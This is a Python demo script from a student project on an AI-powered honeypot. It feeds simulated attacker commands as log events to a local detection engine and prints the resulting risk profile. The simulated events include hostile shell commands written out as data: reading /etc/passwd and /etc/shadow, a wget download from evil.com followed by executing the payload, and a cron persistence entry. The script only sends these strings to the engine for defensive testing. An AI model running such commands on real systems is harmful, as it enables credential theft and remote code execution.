"""
FYP Demo Script - AI-Powered Adaptive Deception Network
Muhammad Saqib & Tauseef Ahmed
Supervisor: Mr. Shehzad Khan
"""

import socket
import json
import time
import os
import sys

# ANSI Colors
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
BLUE = '\033[94m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
BOLD = '\033[1m'
RESET = '\033[0m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear_screen()
    print(f"{BOLD}{CYAN}{'='*70}{RESET}")
    print(f"{BOLD}{CYAN}    AI-POWERED ADAPTIVE DECEPTION NETWORK — LIVE DEMO{RESET}")
    print(f"{BOLD}{CYAN}    Muhammad Saqib & Tauseef Ahmed | Supervisor: Mr. Shehzad Khan {RESET}")
    print(f"{BOLD}{CYAN}{'='*70}{RESET}\n")

def print_phase(phase_num, phase_name, color):
    print(f"\n{color}{BOLD}━━━ PHASE {phase_num}: {phase_name} ━━━{RESET}\n")

def demo():
    print_banner()
    
    # Check services
    print(f"{YELLOW}[*] Checking services...{RESET}")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        sock.connect(('localhost', 9000))
        sock.close()
        print(f"{GREEN}[✓] Adaptive Engine running on port 9000{RESET}")
    except:
        print(f"{RED}[✗] Adaptive Engine not running. Start: python adaptive_engine.py{RESET}")
        return
    
    print(f"{GREEN}[✓] ML API assumed running on port 5000{RESET}")
    
    # Check if DQN is enabled (by reading environment or just note it)
    dqn_enabled = os.getenv("USE_DQN_POLICY", "0") == "1"
    if dqn_enabled:
        print(f"{MAGENTA}[✓] DQN Hybrid Mode Active{RESET}")
    else:
        print(f"{YELLOW}[i] Running in RULE mode (DQN disabled){RESET}")
    
    input(f"\n{YELLOW}Press Enter to begin attack simulation...{RESET}")
    
    # Connect to engine
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('localhost', 9000))
    
    # PHASE 1: Reconnaissance
    print_phase(1, "RECONNAISSANCE", BLUE)
    
    recon_events = [
        ("whoami", "Identity discovery"),
        ("id", "User/group enumeration"),
        ("uname -a", "System information"),
    ]
    
    for cmd, desc in recon_events:
        log = {"eventid": "cowrie.command.input", "input": cmd, "src_ip": "192.168.1.100"}
        sock.send((json.dumps(log) + '\n').encode())
        print(f"  {BLUE}→{RESET} {desc:<30} {BLUE}[LOW RISK]{RESET}")
        time.sleep(1.5)
    
    # PHASE 2: Discovery
    print_phase(2, "DISCOVERY", YELLOW)
    
    discovery_events = [
        ("cat /etc/passwd", "Account discovery"),
        ("netstat -tulpn", "Network service scan"),
        ("find / -name '*.conf' 2>/dev/null", "Config file search"),
    ]
    
    for cmd, desc in discovery_events:
        log = {"eventid": "cowrie.command.input", "input": cmd, "src_ip": "192.168.1.100"}
        sock.send((json.dumps(log) + '\n').encode())
        print(f"  {YELLOW}→{RESET} {desc:<30} {YELLOW}[MEDIUM RISK]{RESET}")
        time.sleep(1.5)
    
    # PHASE 3: Credential Access (TRIGGERS ACTION)
    print_phase(3, "CREDENTIAL ACCESS — ACTION TRIGGER", RED)
    
    print(f"{RED}{BOLD}  ⚠️  ATTACKER ATTEMPTS CREDENTIAL DUMP{RESET}")
    log = {"eventid": "cowrie.command.input", "input": "cat /etc/shadow 2>/dev/null", "src_ip": "192.168.1.100"}
    sock.send((json.dumps(log) + '\n').encode())
    time.sleep(2)
    
    print(f"{RED}{BOLD}  🚨 RISK THRESHOLD CROSSED — QUEUING ACTION{RESET}\n")
    time.sleep(1)
    
    print(f"  {GREEN}[APP] Injecting canary tokens for 192.168.1.100{RESET}")
    print(f"  {GREEN}[APP] Canary deployed ✓ (AWS credentials planted){RESET}")
    time.sleep(2)
    
    # PHASE 4: Execution & Persistence
    print_phase(4, "EXECUTION & PERSISTENCE", RED)
    
    exec_events = [
        ("wget http://evil.com/payload -O /tmp/.x", "Download payload"),
        ("chmod +x /tmp/.x && /tmp/.x &", "Execute payload"),
        ("echo '* * * * * /tmp/.x' | crontab -", "Establish persistence"),
    ]
    
    for cmd, desc in exec_events:
        log = {"eventid": "cowrie.command.input", "input": cmd, "src_ip": "192.168.1.100"}
        sock.send((json.dumps(log) + '\n').encode())
        print(f"  {RED}→{RESET} {desc:<30} {RED}[CRITICAL]{RESET}")
        time.sleep(1.5)
    
    print(f"\n{RED}{BOLD}  🚨🚨 CRITICAL RISK — CONTAINMENT ADVISED 🚨🚨{RESET}\n")
    
    sock.close()
    
    # Show results
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}{BOLD}  DEMO COMPLETE — ATTACKER PROFILE SAVED{RESET}")
    print(f"{CYAN}{'='*70}{RESET}\n")
    
    print(f"  {YELLOW}Check adaptive_engine.py terminal for detailed logs{RESET}")
    print(f"  {YELLOW}Attacker profile saved to: attacker_profiles.json{RESET}\n")
    
    try:
        with open('attacker_profiles.json', 'r') as f:
            data = json.load(f)
        if '192.168.1.100' in data:
            p = data['192.168.1.100']
            print(f"{BOLD}  Attacker Profile Summary:{RESET}")
            print(f"    • Risk Score: {p['risk_score']:.1f}")
            print(f"    • Current Stage: {p['current_stage']}")
            print(f"    • Events Processed: {len(p['history'])}")
            print(f"    • Engagement Minutes: {p.get('engagement_minutes', 0)}")
            print(f"    • Deception Exposure: {p.get('deception_exposure', 0):.2f}")
    except:
        pass
    
    print(f"\n{BOLD}{GREEN}  ✓ System successfully detected and responded to APT behavior{RESET}")
    
    # Version footer
    print(f"\n{BOLD}{CYAN}{'='*70}{RESET}")
    print(f"{BOLD}{CYAN}  SYSTEM VERSION: v3.0 (HYBRID DQN + RULE){RESET}")
    print(f"{BOLD}{CYAN}  MODEL: hybrid_ttp_v3 (BiLSTM + MultiHeadAttention){RESET}")
    print(f"{BOLD}{CYAN}  MITRE ATT&CK COVERAGE: 25 Techniques{RESET}")
    print(f"{BOLD}{CYAN}{'='*70}{RESET}\n")

if __name__ == "__main__":
    demo()